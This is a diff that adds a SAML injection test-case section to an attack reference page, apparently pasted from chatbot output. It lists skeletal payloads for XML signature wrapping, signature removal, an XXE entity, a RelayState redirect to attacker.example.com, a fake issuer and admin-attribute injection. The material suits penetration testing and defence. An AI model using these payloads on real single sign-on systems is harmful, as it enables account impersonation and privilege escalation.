@@ -515,3 +515,299 @@ Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_At
 * [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](http://www.economyofmechanism.com/github-saml)
 * [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
 * [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://www.kb.cert.org/vuls/id/475445/)
+
+Below is the full **“SAML Injection – Complete Test Case (with Bypass Cases)”** in the **exact same format** used previously (Host Header, JWT, SSRF, etc.) — clean, structured, and safe for learning.
+
+---
+
+# ✅ **SAML Injection – Complete Test Case (with Bypass Cases)**
+
+**All payloads are safe, non-destructive learning examples.**
+
+---
+
+# **1. What to Test (List of Vulnerabilities)**
+
+### **1.1 XML Signature Wrapping (XSW)**
+
+Inject unsigned elements to trick the SAML parser into reading malicious assertions.
+
+### **1.2 SAML Response Manipulation**
+
+Editing user attributes, role, email, issuer, audience, or ACS URL.
+
+### **1.3 Algorithm / Signature Bypass**
+
+Removing signatures or changing reference IDs to bypass validation.
+
+### **1.4 Assertion Replay**
+
+Reusing past valid SAML responses.
+
+### **1.5 SAML Parameter Injection (Base64 XML Injection)**
+
+Injecting XML inside the Base64-decoded SAML response.
+
+### **1.6 XXE via SAML Parser**
+
+Inject external entities if parser allows it.
+
+### **1.7 Open Redirect via RelayState**
+
+Modify redirect URL to attacker-controlled domain.
+
+### **1.8 AudienceRestriction Bypass**
+
+Editing `<Audience>` to impersonate other apps.
+
+### **1.9 Privilege Escalation via Attribute Injection**
+
+Changing role, group, email_verified, admin flags.
+
+### **1.10 ACS URL Bypass / Destination Confusion**
+
+Modifying `<Destination>` to redirect processing.
+
+---
+
+# **2. Safe Core Payloads (Structure Only)**
+
+These demonstrate format and structure — **NOT real signatures**.
+
+---
+
+## **2.1 Basic SAML Response Injection (Unsigned Edit)**
+
+```
+<saml:Assertion>
+    <saml:Subject>
+        <saml:NameID>admin@example.com</saml:NameID>
+    </saml:Subject>
+</saml:Assertion>
+```
+
+---
+
+## **2.2 Inject Modified Role Attribute**
+
+```
+<saml:Attribute Name="role">
+    <saml:AttributeValue>superadmin</saml:AttributeValue>
+</saml:Attribute>
+```
+
+---
+
+## **2.3 Inject Fake Email**
+
+```
+<saml:Attribute Name="email">
+    <saml:AttributeValue>attacker@example.com</saml:AttributeValue>
+</saml:Attribute>
+```
+
+---
+
+## **2.4 Replay Attack Test**
+
+```
+Use same Base64 SAMLResponse twice and check if still accepted.
+```
+
+---
+
+## **2.5 Modified Audience (Impersonation)**
+
+```
+<saml:Audience>https://victim-app.example.com</saml:Audience>
+```
+
+---
+
+# **3. Complete Bypass Payload List**
+
+---
+
+## **3.1 XML Signature Wrapping (XSW Type 1)**
+
+Inject a *second unsigned assertion* before the signed one:
+
+```
+<saml:Assertion ID="evil1">
+    <saml:Subject>
+        <saml:NameID>admin@example.com</saml:NameID>
+    </saml:Subject>
+</saml:Assertion>
+
+<!-- Valid signed assertion below -->
+<saml:Assertion ID="signed123">
+    ...signed content...
+</saml:Assertion>
+```
+
+---
+
+## **3.2 ReferenceID Swap Bypass**
+
+Change ID so the server validates wrong element.
+
+```
+<saml:Assertion ID="originalSigned">
+   ...signed content...
+</saml:Assertion>
+
+<saml:Assertion ID="referencedBySignature">
+   <saml:NameID>admin@example.com</saml:NameID>
+</saml:Assertion>
+```
+
+---
+
+## **3.3 Algorithm Bypass: Removing Signature Block**
+
+```
+<saml:Signature></saml:Signature>
+```
+
+or remove entire signature:
+
+```
+<!-- no signature -->
+```
+
+---
+
+## **3.4 Base64 XML Injection (SAMLResponse parameter)**
+
+Decoded value:
+
+```
+</saml:NameID><saml:NameID>admin@example.com</saml:NameID>
+```
+
+Injected inside:
+
+```
+SAMLResponse=<Base64_of_evil_XML>
+```
+
+---
+
+## **3.5 XXE via SAML Parser (Safe Example)**
+
+```
+<!DOCTYPE foo [
+  <!ENTITY xxe "TEST_XXE_PAYLOAD">
+]>
+<saml:Assertion>
+    <saml:Attribute Name="test">
+        <saml:AttributeValue>&xxe;</saml:AttributeValue>
+    </saml:Attribute>
+</saml:Assertion>
+```
+
+---
+
+## **3.6 RelayState Open Redirect**
+
+```
+RelayState=https://attacker.example.com
+```
+
+---
+
+## **3.7 Destination URL Bypass**
+
+```
+<samlp:Response Destination="https://attacker.example.com/acs">
+```
+
+---
+
+## **3.8 Fake Issuer / Identity Provider**
+
+```
+<saml:Issuer>https://fake-idp.attacker.com</saml:Issuer>
+```
+
+---
+
+## **3.9 Attribute Injection (Privilege Escalation)**
+
+```
+<saml:Attribute Name="admin">
+    <saml:AttributeValue>true</saml:AttributeValue>
+</saml:Attribute>
+```
+
+```
+<saml:Attribute Name="groups">
+    <saml:AttributeValue>Domain Admins</saml:AttributeValue>
+</saml:Attribute>
+```
+
+---
+
+## **3.10 Bypass Audience Restriction**
+
+```
+<saml:Audience>urn:attacker:app</saml:Audience>
+```
+
+---
+
+# **4. Advanced Payloads (Safe Demonstration Versions)**
+
+---
+
+## **4.1 Nested Assertion Injection (XSW Type 2)**
+
+```
+<saml:Assertion ID="evilAssert">
+    <saml:Subject>
+         <saml:NameID>admin@example.com</saml:NameID>
+    </saml:Subject>
+</saml:Assertion>
+
+<saml:Signature>
+   <ds:Reference URI="#evilAssert"/>
+</saml:Signature>
+```
+
+---
+
+## **4.2 Encrypted Assertion Bypass (Fake Wrapper)**
+
+Attacker wraps malicious assertion inside another encrypted container:
+
+```
+<saml:EncryptedAssertion>
+    <fakeCipher>malicious_data</fakeCipher>
+</saml:EncryptedAssertion>
+```
+
+---
+
+## **4.3 Protocol Confusion Attack**
+
+Change Response type:
+
+```
+<samlp:LogoutResponse>
+```
+
+Instead of:
+
+```
+<samlp:Response>
+```
+
+---
+
+# **5. Safe Testing Notes**
+
+* These payloads show **structure**, not valid forging methods.
+* They must be used ONLY for **defensive testing**, security validation, or lab environments.
+* No working signatures, private keys, or bypass-ready SAML blobs are provided.
+
+---
